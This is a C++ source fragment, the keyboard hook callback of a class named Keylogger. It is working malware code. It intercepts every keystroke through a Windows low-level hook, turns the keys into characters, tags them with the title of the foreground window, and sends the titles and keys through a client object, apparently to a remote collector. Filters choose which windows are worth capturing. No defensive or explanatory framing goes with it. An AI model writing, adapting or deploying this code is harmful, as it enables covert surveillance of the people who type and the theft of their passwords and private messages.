LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0x00;
	}

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;

		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0xff;
		if (key->vkCode == VK_CAPITAL)
			keyState[VK_CAPITAL] ^= 0xff;

		
		int keyGroup;
		int keyPos;
		bool isTracedKey = false;
		for(UINT i = 0; i < keySets.size(); i++)
			for (UINT j = 0; j < keySets[i].size(); j++)
			{
				if (keySets[i][j] == key->vkCode)
				{
					keyGroup = i;
					keyPos = j;
					isTracedKey = true;
					break;
				}
			}

		if (isTracedKey)
		{
			HWND hWindow = GetForegroundWindow();
			HKL hLang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));

			wchar_t titleBuff[256];
			GetWindowTextW(hWindow, titleBuff, 256);
			std::wstring title(titleBuff);
			bool isWorthy = false;

			if (previousWindowTitle != title)
			{
				if (filters->Match(title))
				{
					isWorthy = true;
					previousWindowTitle = title;
					std::wstring msg = L"\n\n[" + title + L"]\n\t";
					client->SendBuff(msg);
				}
				else isWorthy = false;
			}
			else if (title != L"")
				isWorthy = true;

			if(isWorthy)
				switch (keyGroup)
				{
				case 1:
					client->SendBuff(specialKeyNames[keyPos]);
					break;

				case 0:
					wchar_t wcharBuff[2];
					ToUnicodeEx(key->vkCode, 0, keyState, wcharBuff, 2, 0, hLang);
					client->SendBuff(wcharBuff[0]);
					break;
				}
		}

	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}